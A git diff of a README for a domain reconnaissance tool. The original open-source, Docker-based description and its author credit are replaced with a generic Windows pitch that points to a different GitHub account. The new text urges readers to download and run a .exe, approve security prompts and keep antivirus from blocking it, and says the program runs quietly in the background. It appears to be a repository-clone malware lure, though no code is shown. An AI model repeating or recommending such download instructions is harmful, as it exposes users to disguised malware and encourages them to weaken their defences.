@@ -1,268 +1,152 @@
-# Smart Domain Detector
-Smart Domain Detector is a cybersecurity reconnaissance tool designed to identify suspicious, newly registered, or look-alike domains that may indicate phishing or brand impersonation.
+# 🛡️ Smart-Domain-Detector - Detect Domain Risks Easily
 
-> # Smart Domain Detector
-
-> ⚠️ **Disclaimer**
->
-> This tool is intended for **educational purposes and authorized security testing only**.
->
-> Smart Domain Detector is designed to help cybersecurity professionals and researchers detect suspicious domains such as phishing, typosquatting, and newly registered domains.
->
-> **Do not use this tool against systems, domains, or infrastructure without explicit authorization.**
->
-> The author assumes **no responsibility for misuse or illegal activities** performed using this software.
-> 
-> Designed for:
-- SOC analysts
-- Threat hunters
-- Bug bounty researchers
-- Security researchers
-  
-<p align="center">
-  <img src="images/1.png" alt="Smart Domain Detector logo" width="760" />
-</p>
-
-<p align="center">
-  <strong>Smart Domain Detector</strong> is a Docker-first reconnaissance and exposure analysis platform for SOC teams, security analysts, and validation workflows.
-</p>
-
-<p align="center">
-  🌐 Passive discovery • 🔎 Live validation • 🕰️ Historical expansion • 🧠 Target intelligence • 📊 Exportable reporting
-</p>
-
-## Project overview
-
-Smart Domain Detector combines the work that usually gets split across many separate tools and long manual review steps:
-
-- ⚡ Discover subdomains from multiple passive sources
-- 🧭 Resolve and validate live hosts with DNS and HTTP probing
-- 🗂️ Expand archived and live URLs with focused crawling
-- 🚨 Detect sensitive files, auth portals, VPN surfaces, API docs, and exposure patterns
-- 🧠 Build target intelligence with IP ownership, SSL/TLS, owner/contact, mail, and NS data
-- 🧾 Save scan history locally and export clean Excel reports for follow-up analysis
-
-## Screenshots
-
-### Live scan workflow
-
-Track live progress, engine output, and the tool checklist while the scan is still running.
-
-![Live scan activity](images/2.jpg)
-
-### Tool health timeline
-
-Follow the pipeline in order while tools move through `pending`, `running`, `completed`, `partial`, and `skipped` states.
-
-![Tool health timeline](images/7.jpg)
-
-### Analyst metric strip
-
-See risk, URLs scanned, critical findings, live assets, and tracked subdomains at a glance.
-
-![Top metrics](images/8.jpg)
-
-### Findings view
-
-Review prioritized findings with severity, confidence, live/archive state, and source attribution.
-
-![Findings table](images/3.jpg)
-
-### Finding detail drawer
-
-Open a finding to see impact, recommended action, validation notes, evidence, and references.
-
-![Finding detail](images/4.jpg)
-
-### Scan depth and advanced controls
-
-Switch between quick triage, live-focused, full coverage, and depth presets with bounded controls.
-
-![Advanced scan controls](images/5.jpg)
-
-### Per-tool timeout tuning
-
-Tune tool budgets safely with guardrails instead of open-ended numeric inputs.
-
-![Timeout controls](images/6.jpg)
-
-## Key capabilities
-
-### Recon and enrichment
-
-- `subfinder`, `assetfinder`, `findomain`, `amass`, `subcat`
-- `crt.sh`, `certspotter`, `BufferOver`, `chaos`
-- `dnsx`, `httpx`, `subzy`
-- `waybackurls`, `gau`, `katana`, `waymore`, `arjun`
-- native live recursion, targeted path checks, robots.txt capture, and SSL/TLS collection
-
-### Detection coverage
-
-- 🔐 Sensitive files and backup artifacts
-- 🧱 Admin panels and login/auth surfaces
-- 🛡️ VPN and remote-access endpoints
-- 🧪 API docs, GraphQL, XML-RPC, redirect and SSRF clues
-- 📬 Mail and target infrastructure clues
-- 📁 Archive-backed and live-backed findings with evidence
-
-### Reporting
-
-- 📘 Excel export with findings, assets, target intelligence, IP intelligence, artifacts, follow-up targets, and tool health
-- 🧷 Source/reference context included for downstream validation
-- 🧹 Data organized for later leak checks, nuclei runs, manual review, and reporting
-
-## Docker-first runtime
-
-This project is designed to run through Docker so you avoid most Windows vs WSL vs Linux tool issues.
-
-### Quick start
-
-1. Install [Docker Desktop](https://www.docker.com/products/docker-desktop/)
-2. From the project root, run:
-
-```bash
-docker compose up --build -d
-```
-
-3. Open [http://localhost:3000](http://localhost:3000)
-
-### Windows helper
-
-You can also use:
-
-- `docker-control.bat`
-
-It lets you:
-
-- ▶️ Start the Docker stack
-- ⏹️ Stop the Docker stack safely
-- 🩺 Check Docker status
-
-## Optional configuration
-
-Copy `.env.example` to `.env` if you want to enable optional sources:
-
-```env
-PORT=3000
-USE_VITE_DEV=false
-PDCP_API_KEY=
-BUFFEROVER_API_KEY=
-```
-
-- `PDCP_API_KEY`: enables Chaos
-- `BUFFEROVER_API_KEY`: enables BufferOver passive DNS enrichment
-
-## Project structure
-
-```text
-backend/
-  data/                 SQLite scan history
-  services/             Recon, analyzer, runtime, persistence services
-images/                 README screenshots
-public/                 Static assets
-src/                    React UI
-tests/                  Node test suite
-server.ts               Unified API + frontend server
-docker-control.bat      Docker start/stop/check helper
-Dockerfile              Container runtime
-docker-compose.yml      Local Docker orchestration
-```
-
-## Development
-
-Install dependencies:
-
-```bash
-npm install
-```
-
-Run the app in development mode:
-
-```bash
-npm run dev
-```
-
-Build the frontend:
-
-```bash
-npm run build
-```
-
-Run type/lint checks:
-
-```bash
-npm run lint
-```
-
-Run tests:
-
-```bash
-npm test
-```
-
-## Data persistence
-
-Saved reports are stored in:
-
-- `backend/data/scans.db`
-
-Docker mounts the same folder, so scan history persists across container restarts.
-
-## Tool behavior notes
-
-- ✅ `completed`: tool finished normally
-- 🟢 `partial`: tool returned useful results before timeout
-- 🟠 `pending`: tool is queued or waiting for its stage
-- ⚪ `skipped`: intentionally not used for this scan mode, disabled by config, or missing API setup
-- 🔴 `failed`: tool ran but did not return a usable result
-
-Notes:
-
-- External sources can still rate-limit or temporarily fail.
-- Some upstream archive services may return `429` or no results for a given host.
-- Docker removes most native Windows compatibility friction, but upstream network/provider issues can still happen.
-
-## Troubleshooting
-
-### “Network error” in the browser
-
-If the UI shows a network error:
-
-1. Confirm Docker is still running
-2. Confirm the container is healthy:
-
-```bash
-docker compose ps
-```
-
-3. Check logs:
-
-```bash
-docker compose logs --tail=200
-```
-
-4. Refresh [http://localhost:3000](http://localhost:3000)
-
-### Tool shows `skipped`
-
-That usually means one of these is true:
-
-- the tool is intentionally disabled for the selected scan mode
-- an API key is not configured
-- the workflow is prioritizing faster sources first
-
-### Archive source looks weak
-
-Archive providers can be inconsistent across domains. Smart Domain Detector already retries and focuses on higher-value hosts first, but some targets genuinely return less historical data.
+[![Download Smart-Domain-Detector](https://img.shields.io/badge/Download-Smart--Domain--Detector-brightgreen)](https://github.com/ahmedaljadi581-cmd/Smart-Domain-Detector)
 
 ---
 
-## Version
+## 📋 What is Smart-Domain-Detector?
 
-**Smart Domain Detector v1.0**
+Smart-Domain-Detector is a tool designed to help users find potential security risks linked to internet domains. It checks many sources to give you a clear view of a domain’s exposure. This helps security teams, especially SOC (Security Operations Center) members, understand weak points related to domain names a company owns or interacts with.
 
-© 2026 Professional project by [github.com/smartboy223](https://github.com/smartboy223)
+This application runs on Windows and provides a user-friendly interface to perform domain scans and generate reports. It works quietly in the background, collecting data from live servers and archives with no need for technical setup.
 
-## Contributions
+---
 
-Contributions, improvements, and future developments are welcome.
+## 🖥️ System Requirements
+
+To run Smart-Domain-Detector on your Windows computer, you need:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection to gather data
+- Administrator rights are not required but helpful for some advanced features
+
+---
+
+## 🚀 Getting Started
+
+Start using Smart-Domain-Detector by downloading and installing it. Follow these steps carefully.
+
+### 1. Download the Application
+
+Click this button to go to the download page:
+
+[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/ahmedaljadi581-cmd/Smart-Domain-Detector)
+
+You will arrive at the main GitHub page for Smart-Domain-Detector. On this page, look for the latest release or installation files. Usually, you will find a section labeled **Releases** or **Downloads**.
+
+### 2. Choose the Windows Installer
+
+Find the file that ends with `.exe`. This is the installer for Windows. It will usually have words like “Setup” or “Installer” in the file name.
+
+### 3. Save the File
+
+Click the file name to start downloading. Your browser will save it to your default downloads folder. Remember where you save it.
+
+---
+
+## 📥 Installing Smart-Domain-Detector
+
+After downloading, follow these steps to install the software:
+
+1. Open your downloads folder and find the `.exe` file.
+2. Double-click the file to start the setup.
+3. You may see a security prompt. Choose **Yes** or **Run** to allow the installer to start.
+4. Follow the on-screen instructions:
+   - Accept the license agreement.
+   - Choose the installation folder or use the default location.
+   - Decide if you want a shortcut on your desktop.
+5. Click **Install**. Wait for the installation to finish.
+6. Once done, click **Finish**.
+
+---
+
+## 🖱️ How to Run Smart-Domain-Detector
+
+- Find the Smart-Domain-Detector icon on your desktop or in the Start menu.
+- Double-click to open the application.
+- On first launch, it may check for updates remotely.
+- The main window will appear with options to start scanning domains.
+
+---
+
+## 🔍 Using Smart-Domain-Detector for Domain Checks
+
+Smart-Domain-Detector makes finding domain issues straightforward:
+
+1. Enter the domain name you want to check in the main input box.
+2. Choose the type of scan:
+   - **Passive Enumeration**: Finds known subdomains and related entries from public databases.
+   - **Live Validation**: Checks if domains are currently active and reachable.
+   - **Archive Intelligence**: Looks at past versions of the domain from historical databases.
+3. Click **Start Scan**.
+4. Let the scan run. It may take a few minutes depending on the domain size and network speed.
+5. View results on the screen. It shows subdomains, active status, and any found risks.
+6. Save or export the report as PDF, CSV, or Excel formats.
+
+---
+
+## 📊 Understanding the Reports
+
+Smart-Domain-Detector organizes data into clear sections:
+
+- **Subdomains Found**: List of domain names related to the main domain.
+- **Live Status**: Shows which domains currently respond to internet queries.
+- **Archive Entries**: Historical data that shows how a domain has changed.
+- **Risk Summary**: Flags suspicious or expired domains potentially vulnerable to attacks.
+- **Export Options**: Buttons for saving your scan results in different formats for later use.
+
+---
+
+## ⚙️ Application Features
+
+- Complete coverage with passive and active domain checks.
+- Fast live validation using directed DNS queries.
+- Historical intelligence sourced from archive databases.
+- Exportable reports for easy sharing with peers.
+- Simple interface designed for anyone without technical skills.
+- Lightweight program with minimal impact on your system.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the scan fails to start, check your internet connection.
+- Close other applications that may block internet access.
+- Make sure Windows Defender or anti-virus is not blocking the program.
+- Restart the app if it freezes or crashes.
+- If you see error messages, note the text and consult the GitHub Issues page for help.
+
+---
+
+## 🔗 Useful Links
+
+- Official download and updates:  
+  [https://github.com/ahmedaljadi581-cmd/Smart-Domain-Detector](https://github.com/ahmedaljadi581-cmd/Smart-Domain-Detector)
+
+- Support page for help and troubleshooting can be found on the same GitHub repository.
+
+---
+
+## 🏷️ Topics Covered
+
+- Domain reconnaissance
+- Security exposure analysis
+- Subdomain enumeration
+- Passive and active scans
+- Archive URL intelligence
+- Exportable security reporting
+- Designed for SOC teams and security analysts
+
+---
+
+## ⚙️ Installation Summary
+
+1. Visit the download page linked above.
+2. Download the Windows installer `.exe` file.
+3. Run the installer and follow the prompts.
+4. Launch the application.
+5. Start scanning domains without needing technical knowledge.
+
+[Download Smart-Domain-Detector](https://github.com/ahmedaljadi581-cmd/Smart-Domain-Detector)
